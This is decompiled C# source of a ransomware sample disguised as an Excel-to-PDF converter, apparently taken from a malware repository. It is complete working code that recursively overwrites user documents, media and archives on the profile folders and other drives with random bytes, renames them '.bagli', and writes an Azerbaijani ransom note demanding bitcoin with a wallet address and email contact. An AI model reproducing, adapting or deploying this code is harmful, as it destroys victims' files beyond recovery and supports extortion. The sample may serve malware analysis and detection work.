// Decompiled with JetBrains decompiler
// Type: ns0.Class0
// Assembly: ExcellToPdf, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B431981D-A4A5-42B7-849E-883F00A6EAEE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-68eddce0bad4515b40581f454e479a42fdd3b89e004fbba162acf339fbe46f09.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace ns0
{
  internal sealed class Class0
  {
    public string string_0 = Environment.UserName;
    public string string_1 = "C:\\Users\\";
    public string[] string_2 = new string[10]
    {
      "Komputerinizdəki fayllar şifrələndi.",
      "Faylların bərpası üçün təqdim olunan bitkoin adresinə bitkoin göndərməyiniz xahiş olunur.",
      "Bərpa etmək üçün məbləği aşağıda göstərilmiş ünvana göndərin. Göndərdikdən sonra email vasitəsi ilə əlaqə saxlayın.",
      "Ödənməmişdən əvvəl yazılan heç bir mail üçün cavab yazılmayacaq. Ödəniş yalnız bitcoin ilə mümükündür.",
      "Narahat olmayın ödənişdən sonra sizə şifrə və proqram veriləcəkdir və sizin fayllar qayıdacaqdır.",
      "Ödəniş qiyməti:350$",
      "Bitcoin address: bc1qnurh904jcnxm0amfg2cy3406k4ed2vd2x67s8p",
      "Email: ramilo2122@yandex.com",
      "ID: 740682679",
      "Bitcoin almaq üçün bəzi saytlar binance.com, cex.io, coinmama.com, coinbase.com"
    };
    private static Random random_0 = new Random();
    internal string[] string_3 = new string[68]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".png",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".PDF",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".dll",
      ".XLSX",
      ".cs",
      ".mp3",
      ".mp4",
      ".DOCX",
      ".dwg",
      ".DOC",
      ".zip",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".lnk",
      ".iso",
      ".7-zip",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".jpeg",
      ".xz",
      ".JPG",
      ".PNG",
      ".mpeg",
      ".mp3",
      ".mpg",
      ".core",
      ".XLS",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".wmv",
      ".MP4"
    };

    public static byte[] smethod_0(int int_0)
    {
      ++int_0;
      byte[] buffer = new byte[int_0];
      Class0.random_0.NextBytes(buffer);
      return buffer;
    }

    public void method_0(string string_4)
    {
      try
      {
        string[] files = Directory.GetFiles(string_4);
        bool flag = true;
        for (int index = 0; index < files.Length; ++index)
        {
          try
          {
            string extension = Path.GetExtension(files[index]);
            string fileName = Path.GetFileName(files[index]);
            if ((!((IEnumerable<string>) this.string_3).Contains<string>(extension) ? 1 : (!(fileName != "oxu.txt") ? 1 : 0)) == 0)
            {
              FileInfo fileInfo = new FileInfo(files[index]);
              if (fileInfo.Length < 1098576L)
              {
                File.WriteAllBytes(files[index], Class0.smethod_0(Convert.ToInt32(fileInfo.Length)));
                File.Move(files[index], files[index] + ".bagli");
              }
              else
              {
                File.WriteAllBytes(files[index], Class0.smethod_0(Convert.ToInt32(1098576)));
                File.Move(files[index], files[index] + ".bagli");
              }
              if (flag)
              {
                flag = false;
                File.WriteAllLines(string_4 + "/oxu.txt", this.string_2);
              }
            }
          }
          catch
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(string_4))
          this.method_0(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public void method_1()
    {
      string string_4_1 = this.string_1 + this.string_0 + "\\Desktop";
      string string_4_2 = this.string_1 + this.string_0 + "\\Links";
      string string_4_3 = this.string_1 + this.string_0 + "\\Contacts";
      string string_4_4 = this.string_1 + this.string_0 + "\\Desktop";
      string string_4_5 = this.string_1 + this.string_0 + "\\Documents";
      string string_4_6 = this.string_1 + this.string_0 + "\\Downloads";
      string string_4_7 = this.string_1 + this.string_0 + "\\Pictures";
      string string_4_8 = this.string_1 + this.string_0 + "\\Music";
      string string_4_9 = this.string_1 + this.string_0 + "\\OneDrive";
      string string_4_10 = this.string_1 + this.string_0 + "\\Saved Games";
      string string_4_11 = this.string_1 + this.string_0 + "\\Favorites";
      string string_4_12 = this.string_1 + this.string_0 + "\\Searches";
      string string_4_13 = this.string_1 + this.string_0 + "\\Videos";
      this.method_0(string_4_1);
      this.method_0(string_4_2);
      this.method_0(string_4_3);
      this.method_0(string_4_4);
      this.method_0(string_4_5);
      this.method_0(string_4_6);
      this.method_0(string_4_7);
      this.method_0(string_4_8);
      this.method_0(string_4_9);
      this.method_0(string_4_10);
      this.method_0(string_4_11);
      this.method_0(string_4_12);
      this.method_0(string_4_13);
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != "C:\\")
          this.method_0(drive.ToString());
      }
    }
  }
}
